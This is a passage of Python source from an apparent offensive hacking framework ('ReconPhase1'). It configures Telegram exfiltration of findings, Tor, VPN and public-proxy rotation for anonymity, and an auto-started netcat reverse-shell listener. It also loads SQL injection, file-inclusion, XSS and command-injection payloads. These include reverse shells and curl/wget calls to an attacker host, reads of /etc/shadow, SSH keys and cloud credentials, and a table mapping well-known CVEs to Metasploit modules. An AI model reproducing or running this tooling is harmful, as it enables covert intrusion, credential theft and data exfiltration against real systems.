            self.sending_thread.join(timeout=5)

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            return {'sent_count': self._sent_count, 'failed_count': self._failed_count, 'queue_size': self._queue_size, 'last_message_id': self._last_message_id}

# ===================================================================
# PROXY MANAGER - HEALTH CHECKING AND WEIGHTED ROTATION
# ===================================================================
class ProxyManager:
    """Manages proxies with health checking, scoring, and weighted rotation."""

    def __init__(self, proxy_list: List[str] = None, health_timeout: int = 5, max_score: float = 100.0):
        self.proxies: List[Dict[str, Any]] = []
        self.health_timeout = health_timeout
        self.max_score = max_score
        self._lock = threading.RLock()
        self._current_index = 0
        if proxy_list:
            for proxy in proxy_list:
                self.add_proxy(proxy)

    def add_proxy(self, proxy: str) -> None:
        with self._lock:
            self.proxies.append({'url': proxy, 'score': self.max_score, 'last_checked': 0, 'success_count': 0, 'failure_count': 0, 'alive': True, 'response_time': 0.0})

    @thread_safe
    def get_proxy(self) -> Optional[str]:
        alive_proxies = [p for p in self.proxies if p['alive']]
        if not alive_proxies:
            return None
        total_score = sum(p['score'] for p in alive_proxies)
        if total_score <= 0:
            return alive_proxies[0]['url']
        rand_val = random.random() * total_score
        cumulative = 0
        for proxy in alive_proxies:
            cumulative += proxy['score']
            if rand_val <= cumulative:
                return proxy['url']
        return alive_proxies[0]['url']

    @thread_safe
    def mark_success(self, proxy_url: str) -> None:
        for p in self.proxies:
            if p['url'] == proxy_url:
                p['success_count'] += 1
                p['score'] = min(self.max_score, p['score'] + 2.0)
                p['alive'] = True
                break

    @thread_safe
    def mark_failure(self, proxy_url: str) -> None:
        for p in self.proxies:
            if p['url'] == proxy_url:
                p['failure_count'] += 1
                p['score'] = max(0, p['score'] - 10.0)
                if p['score'] <= 0:
                    p['alive'] = False
                break

    @thread_safe
    def check_proxy(self, proxy_url: str, test_url: str = "http://httpbin.org/ip") -> bool:
        try:
            start = time.time()
            if REQUESTS_AVAILABLE:
                proxies = {'http': proxy_url, 'https': proxy_url}
                resp = requests.get(test_url, proxies=proxies, timeout=self.health_timeout, verify=False)
                response_time = time.time() - start
                if resp.status_code == 200:
                    for p in self.proxies:
                        if p['url'] == proxy_url:
                            p['response_time'] = response_time
                            p['last_checked'] = time.time()
                            p['alive'] = True
                            p['score'] = min(self.max_score, p['score'] + 1.0)
                            return True
            return False
        except Exception:
            for p in self.proxies:
                if p['url'] == proxy_url:
                    p['alive'] = False
                    p['score'] = max(0, p['score'] - 5.0)
            return False

    @thread_safe
    def check_all_proxies(self, test_url: str = "http://httpbin.org/ip") -> Dict[str, bool]:
        results = {}
        with ThreadPoolExecutor(max_workers=min(50, len(self.proxies))) as executor:
            futures = {}
            for p in self.proxies:
                futures[executor.submit(self.check_proxy, p['url'], test_url)] = p['url']
            for future in as_completed(futures):
                proxy = futures[future]
                results[proxy] = future.result()
        return results

    @thread_safe
    def get_stats(self) -> Dict[str, Any]:
        alive = sum(1 for p in self.proxies if p['alive'])
        avg_score = sum(p['score'] for p in self.proxies) / len(self.proxies) if self.proxies else 0
        return {'total': len(self.proxies), 'alive': alive, 'dead': len(self.proxies) - alive, 'average_score': avg_score, 'success_ratio': sum(p['success_count'] for p in self.proxies) / max(1, sum(p['failure_count'] for p in self.proxies) + sum(p['success_count'] for p in self.proxies))}

# ===================================================================
# RECONPHASE1 CLASS - COMPLETE ENHANCED FOUNDATION
class ReconPhase1:
    """Main class for Phase 1 reconnaissance - COMPLETE ENHANCED FOUNDATION."""

    def __init__(self, config: Union[ConfigDict, Dict[str, Any], None] = None):
        self._config_validator = ConfigValidator(CONFIG_JSON)
        self.config: ConfigDict = self._config_validator.load()
        if config:
            self.config.update(config)

        self._state = ScanState.IDLE
        self._previous_state = ScanState.IDLE

        self.logger: Optional[Logger] = None
        self.telegram: Optional[TelegramExfil] = None
        self.db_conn: Optional[sqlite3.Connection] = None
        self.db_cursor: Optional[sqlite3.Cursor] = None
        self.executor: Optional[ThreadPoolExecutor] = None
        self.stop_event = threading.Event()
        self.state: Dict[str, Any] = {}
        self.results = ReconResult()
        self.correlation_id = f"scan_{PID}_{TIMESTAMP}"

        self.thread_lock = threading.RLock()
        self.active_threads = 0
        self.completed_targets = 0
        self.total_targets = 0
        self.checkpoint_counter = 0

        self._http_limiter = RateLimiter(rate=100.0, per=1.0)
        self._dns_limiter = RateLimiter(rate=50.0, per=1.0)
        self._port_limiter = RateLimiter(rate=500.0, per=1.0)

        self._cache_dns = CacheManager(max_size=100000, default_ttl=300)
        self._cache_http = CacheManager(max_size=10000, default_ttl=60)
        self._cache_ports = CacheManager(max_size=50000, default_ttl=180)

        self.proxy_manager = ProxyManager()
        self.task_queue = queue.PriorityQueue(maxsize=100000)

        self.metrics: Dict[str, Any] = defaultdict(int)
        self.metrics_start_time = time.time()
        self.listener_proc = None

        self.subdomain_list: List[str] = []
        self.dir_list: List[str] = []
        self.sqli_payloads: List[str] = []
        self.lfi_payloads: List[str] = []
        self.xss_payloads: List[str] = []
        self.cmd_injection_payloads: List[str] = []
        self.cve_signatures: Dict[str, Dict[str, Any]] = {}

        self._setup_directories()
        self._setup_logging()
        self._setup_db()
        self._setup_telegram()
        self._load_state()
        self._setup_signal_handlers()
        self._auto_install_packages()
        self._auto_start_tor()
        self._auto_start_vpn()
        self._auto_generate_proxies()
        self._auto_start_reverse_shell_listener()
        self._load_wordlists()
        self._load_payloads()
        self._load_config()
        self._start_worker_threads()

        self._transition_state(ScanState.INITIALIZING)

        self.logger.info(f"✅ ReconPhase1 initialized. Scan ID: {self.scan_id}")
        self.logger.info(f"📊 Configuration: {json.dumps(self.config, indent=2)}")

    @property
    def scan_id(self) -> str:
        return TIMESTAMP

    @property
    def state(self) -> ScanState:
        with self.thread_lock:
            return self._state

    def _transition_state(self, target: ScanState) -> None:
        with self.thread_lock:
            if not self._state.can_transition_to(target):
                raise StateError(f"Cannot transition from {self._state.value} to {target.value}")
            self._previous_state = self._state
            self._state = target
            if self.logger:
                self.logger.info(f"State transition: {self._previous_state.value} → {self._state.value}")
            dashboard_data['status'] = target.value

    def _setup_directories(self) -> None:
        directories = [OUTPUT_DIR, RECON_DIR, EXFIL_DIR, LOGS_DIR, SCREENSHOTS_DIR, SHELLS_DIR, REPORTS_DIR, EXPORTS_DIR, CHECKPOINTS_DIR, TEMP_DIR, CONFIG_DIR, DATA_DIR, WORDLIST_DIR, PAYLOADS_DIR, SIGNATURES_DIR, RECON_DIR / 'subdomains', RECON_DIR / 'ports', RECON_DIR / 'technologies', RECON_DIR / 'vulnerabilities', RECON_DIR / 'urls', RECON_DIR / 'waf', RECON_DIR / 'honeypots', RECON_DIR / 'apis', RECON_DIR / 'cves', RECON_DIR / 'shells', RECON_DIR / 'persistence', RECON_DIR / 'lateral', RECON_DIR / 'cloud', RECON_DIR / 'credentials', RECON_DIR / 'keyloggers', RECON_DIR / 'screenshots', RECON_DIR / 'system_info', RECON_DIR / 'network']
        for d in directories:
            d.mkdir(parents=True, exist_ok=True)

    def _setup_logging(self) -> None:
        log_level = self.config.get('log_level', 'DEBUG')
        self.logger = Logger(LOGS_DIR, log_level, self.correlation_id)
        self.logger.info(f"📝 Logging initialized at level {log_level}")

    def _setup_db(self) -> None:
        try:
            self.db_conn = sqlite3.connect(str(DB_PATH), timeout=30, check_same_thread=False)
            self.db_conn.execute('PRAGMA journal_mode=WAL')
            self.db_conn.execute('PRAGMA synchronous=NORMAL')
            self.db_conn.execute('PRAGMA cache_size=10000')
            self.db_conn.execute('PRAGMA temp_store=MEMORY')
            self.db_conn.execute('PRAGMA foreign_keys=ON')
            self.db_cursor = self.db_conn.cursor()
            self.db_cursor.executescript(DB_SCHEMA)
            self.db_cursor.execute("CREATE TABLE IF NOT EXISTS schema_version (version INTEGER PRIMARY KEY, applied_at DATETIME DEFAULT CURRENT_TIMESTAMP)")
            self.db_cursor.execute("INSERT OR IGNORE INTO schema_version (version) VALUES (1)")
            self.db_conn.commit()
            self.logger.info(f"✅ Database initialized: {DB_PATH}")
        except sqlite3.Error as e:
            raise DatabaseError(f"Database initialization failed: {e}")

    def _setup_telegram(self) -> None:
        token = self.config.get('telegram_token', '')
        chat = self.config.get('telegram_chat', '')
        if token and chat and self.config.get('enable_telegram', True):
            self.telegram = TelegramExfil(token, chat, TELEGRAM_FALLBACK, rate_per_second=20.0)
            self.telegram.alert("🚀 OMEGA FINAL PHASE 1 STARTED", f"Scan ID: {self.scan_id}\nCorrelation ID: {self.correlation_id}\nTargets: {self.config.get('targets', 'N/A')}\nThreads: {self.config.get('threads', DEFAULT_THREADS)}\nTor: {self.config.get('tor', True)}\nSelf-destruct: {self.config.get('self_destruct', False)}", "INFO", priority=TaskPriority.CRITICAL)
            self.logger.info("✅ Telegram exfiltration initialized")
        else:
            self.logger.warning("⚠️ Telegram exfiltration disabled - missing token/chat")

    def _load_state(self) -> None:
        state_path = STATE_FILE
        if state_path.exists():
            try:
                with open(state_path, 'r') as f:
                    self.state = json.load(f)
                if 'checksum' in self.state:
                    data_to_check = {k: v for k, v in self.state.items() if k != 'checksum'}
                    computed = hashlib.md5(json.dumps(data_to_check, sort_keys=True).encode()).hexdigest()
                    if computed != self.state['checksum']:
                        self.logger.warning("⚠️ State checksum mismatch - state may be corrupted")
                self.logger.info(f"✅ Loaded state from {state_path}")
                self.logger.info(f"   Previous scan ID: {self.state.get('scan_id')}")
                self.logger.info(f"   Completed targets: {self.state.get('completed_targets', 0)}")
                if self.state.get('checkpoints'):
                    self.logger.info(f"   Found {len(self.state['checkpoints'])} checkpoints")
            except Exception as e:
                self.logger.warning(f"Could not load state: {e}")
                self.state = {}
        else:
            self.state = {'scan_id': self.scan_id, 'correlation_id': self.correlation_id, 'created_at': time.time(), 'checkpoints': []}
            self.logger.info("No previous state found - starting fresh")

    def _save_state(self) -> None:
        state_path = STATE_FILE
        try:
            state_data = {'scan_id': self.scan_id, 'correlation_id': self.correlation_id, 'created_at': self.state.get('created_at', time.time()), 'last_updated': time.time(), 'completed_targets': self.completed_targets, 'total_targets': self.total_targets, 'results': self.results.to_dict(), 'state': self._state.value, 'checkpoints': self.state.get('checkpoints', []), 'metrics': dict(self.metrics)}
            data_to_hash = {k: v for k, v in state_data.items() if k != 'checksum'}
            state_data['checksum'] = hashlib.md5(json.dumps(data_to_hash, sort_keys=True).encode()).hexdigest()
            with open(state_path, 'w') as f:
                json.dump(state_data, f, indent=2, default=str)
            self.state = state_data
            self.logger.debug(f"State saved to {state_path}")
        except Exception as e:
            self.logger.error(f"Could not save state: {e}")

    def _setup_signal_handlers(self) -> None:
        def signal_handler(sig: int, frame: Any) -> None:
            self.logger.warning(f"Received signal {sig} - shutting down gracefully...")
            self.stop_event.set()
            self._transition_state(ScanState.SHUTTING_DOWN)
            self._save_state()
            self._cleanup()
            sys.exit(0)
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        atexit.register(self._cleanup)

    def _auto_install_packages(self) -> None:
        if not self.config.get('enable_auto_install', True):
            return
        self.logger.info("📦 Checking system packages...")
        system_packages = ['tor', 'masscan', 'nmap', 'ffuf', 'jq', 'curl', 'wget', 'git', 'gcc', 'make', 'libssl-dev', 'python3-pip', 'python3-dev', 'go', 'rustc', 'cargo']
        for pkg in system_packages:
            try:
                result = subprocess.run(['dpkg', '-l', pkg], capture_output=True, text=True, timeout=5)
                if 'ii' not in result.stdout:
                    self.logger.info(f"Installing {pkg}...")
                    subprocess.run(['apt-get', 'update', '-qq'], check=False, timeout=30)
                    subprocess.run(['apt-get', 'install', '-y', pkg], check=False, timeout=60)
            except Exception as e:
                self.logger.debug(f"Could not check/install {pkg}: {e}")
        self.logger.info("📦 Checking Python packages...")
        for pkg in REQUIRED_PACKAGES:
            try:
                import_name = pkg.replace('-', '_')
                if pkg == 'dnspython':
                    import_name = 'dns'
                elif pkg == 'pysocks':
                    import_name = 'socks'
                __import__(import_name)
            except ImportError:
                self.logger.info(f"Installing Python package: {pkg}")
                subprocess.run([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'], check=False, timeout=60)
        go_tools = ['github.com/projectdiscovery/httpx/cmd/httpx@latest', 'github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest', 'github.com/lc/gau/v2/cmd/gau@latest', 'github.com/projectdiscovery/katana/cmd/katana@latest', 'github.com/ffuf/ffuf@latest', 'github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest', 'github.com/owasp-amass/amass/v4/...@master']
        for tool in go_tools:
            try:
                subprocess.run(['go', 'install', '-v', tool], check=False, timeout=60)
            except Exception:
                pass

    def _auto_start_tor(self) -> None:
        if not self.config.get('tor', True):
            return
        self.logger.info("🧅 Starting Tor service...")
        try:
            subprocess.run(['systemctl', 'status', 'tor'], capture_output=True, check=True)
            self.logger.info("✅ Tor is already running")
        except Exception:
            try:
                subprocess.run(['systemctl', 'start', 'tor'], check=True, timeout=30)
                self.logger.info("✅ Tor started via systemctl")
            except Exception:
                try:
                    subprocess.run(['service', 'tor', 'start'], check=True, timeout=30)
                    self.logger.info("✅ Tor started via service")
                except Exception:
                    try:
                        subprocess.Popen(['tor', '--run'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(5)
                        self.logger.info("✅ Tor started via tor --run")
                    except Exception:
                        self.logger.warning("⚠️ Could not start Tor - will use proxies only")

    def _auto_start_vpn(self) -> None:
        vpn_config = Path(self.config.get('vpn_config', VPN_CONFIG))
        if not vpn_config.exists():
            return
        self.logger.info("🔒 Starting VPN connection...")
        try:
            subprocess.Popen(['openvpn', '--config', str(vpn_config), '--daemon'])
            time.sleep(5)
            self.logger.info("✅ VPN started")
        except Exception as e:
            self.logger.warning(f"⚠️ Could not start VPN: {e}")

    def _auto_generate_proxies(self) -> None:
        proxy_file = Path(self.config.get('proxies_file', PROXY_FILE))
        if proxy_file.exists():
            try:
                with open(proxy_file, 'r') as f:
                    proxies = [line.strip() for line in f if line.strip()]
                for p in proxies:
                    self.proxy_manager.add_proxy(p)
                self.logger.info(f"✅ Loaded {len(proxies)} proxies from {proxy_file}")
                threading.Thread(target=self._check_proxies_background, daemon=True).start()
                return
            except Exception:
                pass
        self.logger.info("🌀 Generating proxy list...")
        default_proxies = ['socks5://127.0.0.1:9050', 'socks5://127.0.0.1:9051', 'socks5://127.0.0.1:9052', 'http://127.0.0.1:8080', 'http://127.0.0.1:3128', 'socks5://127.0.0.1:1080', 'http://127.0.0.1:8118']
        try:
            if REQUESTS_AVAILABLE:
                resp = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all', timeout=10)
                if resp.status_code == 200:
                    public_proxies = [f"http://{line.strip()}" for line in resp.text.split('\n') if line.strip()]
                    default_proxies.extend(public_proxies[:1000])
        except Exception:
            pass
        for p in default_proxies:
            self.proxy_manager.add_proxy(p)
        proxy_file.parent.mkdir(parents=True, exist_ok=True)
        with open(proxy_file, 'w') as f:
            f.write('\n'.join(default_proxies))
        self.logger.info(f"✅ Generated {len(default_proxies)} proxies")

    def _check_proxies_background(self) -> None:
        while not self.stop_event.is_set():
            try:
                self.proxy_manager.check_all_proxies()
                time.sleep(60)
            except Exception:
                time.sleep(60)

    def _auto_start_reverse_shell_listener(self) -> None:
        listen_ip = self.config.get('reverse_shell_ip', REVERSE_SHELL_IP)
        listen_port = self.config.get('reverse_shell_port', REVERSE_SHELL_PORT)
        self.logger.info(f"🐚 Starting reverse shell listener on {listen_ip}:{listen_port}")
        try:
            cmd = ['nc', '-lvnp', str(listen_port)]
            if listen_ip != '0.0.0.0':
                cmd = ['nc', '-lvnp', str(listen_port), '-s', listen_ip]
            self.listener_proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
            self.logger.info(f"✅ Reverse shell listener started (PID: {self.listener_proc.pid})")
        except Exception as e:
            self.logger.warning(f"⚠️ Could not start reverse shell listener: {e}")

    def _load_wordlists(self) -> None:
        self.logger.info("📚 Loading wordlists...")
        wordlist_path = Path(self.config.get('wordlist_path', WORDLIST_DIR / 'subdomains.txt'))
        try:
            if wordlist_path.exists():
                with open(wordlist_path, 'r') as f:
                    base_subdomains = [line.strip().lower() for line in f if line.strip() and not line.startswith('#')]
                self.logger.info(f"   Loaded {len(base_subdomains)} base subdomains")
            else:
                self.logger.warning(f"   Wordlist not found: {wordlist_path}, using built-in")
                base_subdomains = ['www', 'mail', 'web', 'api', 'dev', 'test', 'staging', 'prod', 'admin', 'blog', 'shop', 'store', 'support', 'help', 'info', 'app', 'mobile', 'vpn', 'dns', 'smtp', 'pop3', 'imap', 'ftp', 'ssh', 'git', 'svn', 'jenkins', 'jira', 'confluence', 'nexus', 'artifactory', 'sonarqube', 'kibana', 'elastic', 'grafana', 'prometheus', 'monitor', 'logs', 'metrics', 'analytics']
            self.logger.info("   Generating permutations...")
            permutations_list = []
            prefixes = ['dev-', 'test-', 'staging-', 'prod-', 'backup-', 'old-', 'new-', 'beta-', 'alpha-']
            suffixes = ['-dev', '-test', '-staging', '-prod', '-backup', '-old', '-new', '-beta', '-alpha']
            numbers = ['1', '2', '3', '4', '5', '01', '02', '03', '04', '05', '10', '20', '30', '50']
            tlds = ['com', 'net', 'org', 'io', 'co', 'uk', 'de', 'fr', 'au', 'ca', 'jp', 'cn', 'in', 'br', 'ru']
            for sub in base_subdomains[:1000]:
                permutations_list.append(sub)
                for p in prefixes:
                    permutations_list.append(f"{p}{sub}")
                for s in suffixes:
                    permutations_list.append(f"{sub}{s}")
                for num in numbers:
                    permutations_list.append(f"{sub}{num}")
                for tld in tlds:
                    permutations_list.append(f"{sub}.{tld}")
            self.subdomain_list = list(set(permutations_list))
            self.logger.info(f"✅ Generated {len(self.subdomain_list)} subdomain permutations")
        except Exception as e:
            self.logger.error(f"Error loading subdomain wordlist: {e}")
            self.subdomain_list = ['www', 'mail', 'web', 'api', 'dev', 'test', 'admin']

        dirs_path = Path(self.config.get('dirs_wordlist', WORDLIST_DIR / 'dirs.txt'))
        try:
            if dirs_path.exists():
                with open(dirs_path, 'r') as f:
                    self.dir_list = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                self.logger.info(f"✅ Loaded {len(self.dir_list)} directory entries")
            else:
                self.logger.warning(f"   Dirs list not found: {dirs_path}, using built-in")
                self.dir_list = ['admin', 'api', 'backup', 'config', 'data', 'db', 'docs', 'images', 'includes', 'js', 'logs', 'media', 'scripts', 'static', 'styles', 'tmp', 'uploads', 'css', 'fonts', 'img', 'lib', 'src', 'vendor', 'views', 'assets', 'download', 'files', 'private', 'public', 'protected', 'secure', 'temp', 'test', 'tests', 'phpmyadmin', 'phpinfo', 'info', 'status', 'health']
        except Exception as e:
            self.logger.error(f"Error loading dirs wordlist: {e}")
            self.dir_list = ['admin', 'api', 'backup']

    def _load_payloads(self) -> None:
        self.logger.info("💉 Loading payloads...")

        self.sqli_payloads = [
            "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--", "admin'--", "1' AND '1'='1", "1' AND '1'='2", "' OR 'x'='x", "' OR 'x'='x'--", "' OR 'x'='x'#", "' OR 1=1#", "' OR 1=1--", "' OR ''='", "' OR 'a'='a", "' OR 'a'='a'--", "' OR 'a'='a'#", "') OR ('1'='1", "') OR ('1'='1'--", "') OR ('a'='a", "' OR EXISTS(SELECT * FROM users WHERE username='admin')--", "' UNION SELECT username,password FROM users--", "' UNION SELECT table_name,column_name FROM information_schema.columns--", "' AND 1=0 UNION SELECT 1,2,3--", "' AND SLEEP(5)--", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "' AND BENCHMARK(1000000,MD5(1))--", "' AND pg_sleep(5)--", "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--", "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "' AND (SELECT COUNT(*) FROM information_schema.columns)>0--", "' AND (SELECT COUNT(*) FROM mysql.user)>0--", "' AND (SELECT COUNT(*) FROM pg_user)>0--"
        ]

        self.lfi_payloads = [
            '../../../../etc/passwd', '../../../../etc/shadow', '../../../../proc/self/environ', '../../../../var/log/auth.log', '../../../../var/log/apache2/access.log', '../../../../var/log/nginx/access.log', '../../../../.ssh/id_rsa', '../../../../.aws/credentials', '../../../../.env', '../../../../.git/config', '../../../../.htaccess', '../../../../web.config', '../../../../wp-config.php', '../../../../config.php', '../../../../database.yml', '../../../../appsettings.json', 'php://filter/convert.base64-encode/resource=../../../../etc/passwd', 'php://filter/convert.base64-encode/resource=../../../../.env', 'php://input', 'php://memory', 'data://text/plain,<?php system($_GET["cmd"]); ?>', 'expect://id', 'expect://whoami', 'expect://uname -a', 'expect://ls -la', 'file:///etc/passwd', 'file:///etc/shadow', 'file:///proc/self/environ'
        ]

        self.xss_payloads = [
            '<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>', 'javascript:alert(1)', '<body onload=alert(1)>', '<svg onload=alert(1)>', '<iframe src="javascript:alert(1)">', '<input onfocus=alert(1) autofocus>', '<details open ontoggle=alert(1)>', '<marquee onstart=alert(1)>', '<video src=x onerror=alert(1)>', '<audio src=x onerror=alert(1)>', '<object data=javascript:alert(1)>', '<embed src=javascript:alert(1)>', '<form action=javascript:alert(1)>', '<button onclick=alert(1)>', '<div onmouseover=alert(1)>', '<a href=javascript:alert(1)>', '"><img src=x onerror=alert(1)>', '\'-alert(1)-\'', '`-alert(1)-`', '${alert(1)}', '{{alert(1)}}', '<%alert(1)%>'
        ]

        self.cmd_injection_payloads = [
            ';id', '|whoami', '&dir', '&&whoami', '||whoami', '`whoami`', '$(whoami)', ';whoami', '|id', '&id', '&&id', '||id', ';cat /etc/passwd', '|curl http://attacker.com/$(whoami)', ';wget http://attacker.com/shell.sh', '|bash -i >& /dev/tcp/attacker/4444 0>&1', ';python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"'
        ]

        self.cve_signatures = {
            'CVE-2017-0143': {'name': 'EternalBlue', 'cvss': 9.3, 'type': 'SMB RCE', 'port': 445, 'signature': r'\\x00\\x00\\x00\\x85\\x00\\x00\\x00\\x00', 'detection': 'SMB version < 1.0', 'exploit_code': 'use exploit/windows/smb/ms17_010_eternalblue'},
            'CVE-2019-0708': {'name': 'BlueKeep', 'cvss': 9.8, 'type': 'RDP RCE', 'port': 3389, 'signature': r'\\x03\\x00\\x00\\x0b', 'detection': 'RDP version < 6.1', 'exploit_code': 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce'},
            'CVE-2020-1472': {'name': 'ZeroLogon', 'cvss': 10.0, 'type': 'Netlogon LPE', 'port': 445, 'signature': r'\\x00\\x00\\x00\\x00', 'detection': 'Netlogon vuln', 'exploit_code': 'use exploit/windows/dcerpc/cve_2020_1472_zerologon'},
            'CVE-2021-44228': {'name': 'Log4Shell', 'cvss': 10.0, 'type': 'JNDI RCE', 'port': 0, 'signature': r'\\$\\{jndi:ldap://', 'detection': 'Log4j version < 2.15.0', 'exploit_code': 'use exploit/multi/http/log4shell'},
            'CVE-2022-22965': {'name': 'Spring4Shell', 'cvss': 9.8, 'type': 'Spring RCE', 'port': 0, 'signature': r'Spring Framework', 'detection': 'Spring < 5.3.18', 'exploit_code': 'use exploit/multi/http/spring4shell'},
            'CVE-2024-6387': {'name': 'OpenSSH RCE', 'cvss': 9.8, 'type': 'SSH RCE', 'port': 22, 'signature': r'OpenSSH_[0-9]\\.[0-9]p[0-9]', 'detection': 'OpenSSH < 9.8p1', 'exploit_code': 'use exploit/linux/ssh/openssh_rce'},
            'CVE-2024-4577': {'name': 'PHP CGI RCE', 'cvss': 9.8, 'type': 'PHP RCE', 'port': 0, 'signature': r'PHP/[0-9]\\.[0-9]\\.[0-9]', 'detection': 'PHP < 8.1.29', 'exploit_code': 'use exploit/multi/http/php_cgi_rce'},
            'CVE-2021-4034': {'name': 'PwnKit', 'cvss': 7.8, 'type': 'Linux LPE', 'port': 0, 'signature': r'pkexec', 'detection': 'pkexec < 1.12.8', 'exploit_code': 'use exploit/linux/local/pwnkit'},
            'CVE-2022-0847': {'name': 'DirtyPipe', 'cvss': 7.8, 'type': 'Kernel LPE', 'port': 0, 'signature': r'Linux [0-9]\\.[0-9]\\.[0-9]', 'detection': 'Linux < 5.17', 'exploit_code': 'use exploit/linux/local/dirtypipe'},
            'CVE-2023-0386': {'name': 'OverlayFS LPE', 'cvss': 7.8, 'type': 'Linux LPE', 'port': 0, 'signature': r'Linux [0-9]\\.[0-9]\\.[0-9]', 'detection': 'Linux < 5.19', 'exploit_code': 'use exploit/linux/local/overlayfs'}
        }

        self.logger.info(f"✅ Loaded {len(self.sqli_payloads)} SQLi payloads")
        self.logger.info(f"✅ Loaded {len(self.lfi_payloads)} LFI payloads")
        self.logger.info(f"✅ Loaded {len(self.xss_payloads)} XSS payloads")
        self.logger.info(f"✅ Loaded {len(self.cmd_injection_payloads)} command injection payloads")
        self.logger.info(f"✅ Loaded {len(self.cve_signatures)} CVE signatures")

    def _load_config(self) -> None:
        config_path = Path(self.config.get('config_file', CONFIG_JSON))
        if config_path.exists():
            try:
                with open(config_path, 'r') as f:
                    file_config = json.load(f)
                    self.config.update(file_config)
                self.logger.info(f"✅ Loaded config from {config_path}")
            except Exception as e:
                self.logger.warning(f"Could not load config: {e}")

    def _start_worker_threads(self) -> None:
        self.logger.info("🔄 Starting worker threads...")
        self.executor = ThreadPoolExecutor(max_workers=self.config.get('threads', DEFAULT_THREADS), thread_name_prefix="ReconWorker")
        self.logger.info(f"✅ Worker thread pool started with {self.executor._max_workers} threads")

    def _cleanup(self) -> None:
        self.logger.info("🧹 Cleaning up...")
        self.stop_event.set()
        self._save_state()
        if self.db_conn:
            try:
                self.db_conn.commit()
                self.db_conn.close()
            except Exception:
                pass
        if self.telegram:
            try:
                self.telegram.flush()
                self.telegram.close()
            except Exception:
                pass
        if self.executor:
            try:
                self.executor.shutdown(wait=False, cancel_futures=True)
            except Exception:
                pass
        if hasattr(self, 'listener_proc') and self.listener_proc:
            try:
                self.listener_proc.terminate()
                self.listener_proc.wait(timeout=5)
            except Exception:
                pass
        try:
            shutil.rmtree(TEMP_DIR, ignore_errors=True)
        except Exception:
            pass
        self.logger.info("✅ Cleanup complete")

    @retry(max_attempts=3, backoff=2.0, exceptions=(DatabaseError,))
    def _log_to_db(self, table: str, data: Dict[str, Any]) -> None:
        if not self.db_conn or not self.db_cursor:
            raise DatabaseError("Database not initialized")
        try:
            columns = ','.join(data.keys())
            placeholders = ','.join(['?'] * len(data))
            query = f"INSERT INTO {table} ({columns}) VALUES ({placeholders})"
            self.db_cursor.execute(query, list(data.values()))
            self.db_conn.commit()
        except sqlite3.Error as e:
            raise DatabaseError(f"DB insert error: {e}")

    @retry(max_attempts=3, backoff=2.0)
    def _batch_log_to_db(self, table: str, batch_data: List[Dict[str, Any]]) -> None:
        if not batch_data or not self.db_conn or not self.db_cursor:
            return
        try:
            columns = ','.join(batch_data[0].keys())
            placeholders = ','.join(['?'] * len(batch_data[0]))
            query = f"INSERT INTO {table} ({columns}) VALUES ({placeholders})"
            self.db_cursor.executemany(query, [list(row.values()) for row in batch_data])
            self.db_conn.commit()
            self.metrics[f'db_batch_inserts_{table}'] += 1
            self.metrics[f'db_rows_inserted_{table}'] += len(batch_data)
        except sqlite3.Error as e:
            raise DatabaseError(f"Batch DB insert error: {e}")

    def _save_json(self, data: Any, filename: str) -> None:
        path = RECON_DIR / filename
        try:
            with gzip.open(f"{path}.gz", 'wt', encoding='utf-8') as f:
                json.dump(data, f, indent=2, default=str)
            self.logger.debug(f"Saved to {path}.gz")
        except Exception as e:
            self.logger.error(f"Could not save {filename}: {e}")

    def _add_checkpoint(self, step: str, target: str = "", data: Any = None) -> None:
        if not self.config.get('enable_checkpoint', True):
            return
        checkpoint = {'id': self.checkpoint_counter, 'phase': 1, 'step': step, 'target': target, 'data': json.dumps(data, default=str) if data else '', 'timestamp': datetime.datetime.now().isoformat(), 'checksum': hashlib.md5(f"{step}{target}{time.time()}".encode()).hexdigest()}
        self.state.setdefault('checkpoints', []).append(checkpoint)
        self.checkpoint_counter += 1
        try:
            self._log_to_db('checkpoints', {'phase': 1, 'step': step, 'target': target, 'data': json.dumps(data, default=str) if data else '', 'checksum': checkpoint['checksum']})
        except Exception:
            pass

    def _get_proxy(self) -> Optional[str]:
        proxy = self.proxy_manager.get_proxy()
        if proxy:
            self.metrics['proxy_requests'] += 1
        return proxy

    def _increment_metric(self, name: str, value: int = 1) -> None:
        with self.thread_lock:
            self.metrics[name] += value

    def get_metrics(self) -> Dict[str, Any]:
        metrics = dict(self.metrics)
        metrics['uptime'] = time.time() - self.metrics_start_time
        metrics['state'] = self._state.value
        metrics['active_threads'] = self.active_threads
        metrics['completed_targets'] = self.completed_targets
        metrics['total_targets'] = self.total_targets
        return metrics

    def _detect_target_type(self, target: str) -> str:
        if '/' in target:
            return 'cidr'
        try:
            socket.inet_aton(target)
            return 'ip'
        except socket.error:
            return 'domain'

    def _resolve_target(self, target: str) -> List[str]:
        cached = self._cache_dns.get(target)
        if cached is not None:
            return cached

        ips = []
        target_type = self._detect_target_type(target)

        if target_type == 'ip':
            ips = [target]
        elif target_type == 'cidr':
            try:
                network = ipaddress.ip_network(target, strict=False)
                ips = [str(ip) for ip in network.hosts()][:256]
            except Exception as e:
                self.logger.debug(f"CIDR parse failed for {target}: {e}")
                ips = []
        else:
            try:
                self._dns_limiter.wait_and_acquire()
